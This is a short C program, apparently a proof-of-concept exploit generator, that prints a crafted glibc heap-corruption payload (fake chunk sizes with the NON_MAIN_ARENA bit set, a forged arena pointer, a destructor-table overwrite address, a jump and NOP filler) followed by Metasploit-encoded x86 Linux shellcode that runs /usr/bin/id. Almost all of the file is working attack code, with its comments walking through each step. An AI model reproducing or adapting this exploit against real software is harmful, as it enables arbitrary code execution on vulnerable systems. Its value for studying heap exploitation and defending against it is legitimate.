#include <stdio.h>

/* linux_ia32_exec -  CMD=/usr/bin/id Size=72 Encoder=PexFnstenvSub 
http://metasploit.com */
unsigned char scode[] =
"\x31\xc9\x83\xe9\xf4\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x5e"
"\xc9\x6a\x42\x83\xeb\xfc\xe2\xf4\x34\xc2\x32\xdb\x0c\xaf\x02\x6f"
"\x3d\x40\x8d\x2a\x71\xba\x02\x42\x36\xe6\x08\x2b\x30\x40\x89\x10"
"\xb6\xc5\x6a\x42\x5e\xe6\x1f\x31\x2c\xe6\x08\x2b\x30\xe6\x03\x26"
"\x5e\x9e\x39\xcb\xbf\x04\xea\x42";

int main (void) {
        // don't use the first 8 bytes of a chunk for data because
        // when it is free()'d it seems to be garbaged up with
        // strange addresses.
        for (int i = 0; i < 8; i++) putchar(0x41);

        // set the mutex to 0
        fwrite("\x00\x00\x00\x00", 4, 1, stdout);

        // write max_fast a few times, we'll hit it and we'll
        // take up some more bytes
        for (int i = 0; i < 32 / 4; i++)
                fwrite("\x02\x01\x00\x00", 4, 1, stdout);

        // finish this chunk with the address one wants to place at
        // bins[0] + 8 (dtors_end - 12)
        for (int i = 0; i < 984 / 4; i++)
                fwrite("\x70\x96\x04\x08", 4, 1, stdout);

        // fill in the unused mallocated space with A's but
        // preserving the 'size' element (1024 with PREV_INUSE
        // bit set)
        for (int i = 0; i < 721; i++) {
                fwrite("\x09\x04\x00\x00", 4, 1, stdout);
                for (int i = 0; i < 1028; i++)
                        putchar(0x41);
        }
        fwrite("\x09\x04\x00\x00", 4, 1, stdout);

        // this is the memory that heap_for_ptr returned,
        // one wants to fill it with the address of which
        // ar_ptr should have
        for (int i = 0; i < (1024 / 4); i++)
                fwrite("\x10\xa0\x04\x08", 4, 1, stdout);

        // jmp + 12
        fwrite("\xeb\x0c\x90\x90", 4, 1, stdout);

        // size field with NON_MAIN_ARENA set
        fwrite("\x0d\x04\x00\x00", 4, 1, stdout);

        // icky 8 byte filler
        fwrite("\x90\x90\x90\x90\x90\x90\x90\x90", 8, 1, stdout);

        // finally the shellcode
        fwrite(scode, sizeof(scode), 1, stdout);

        return(0);
}
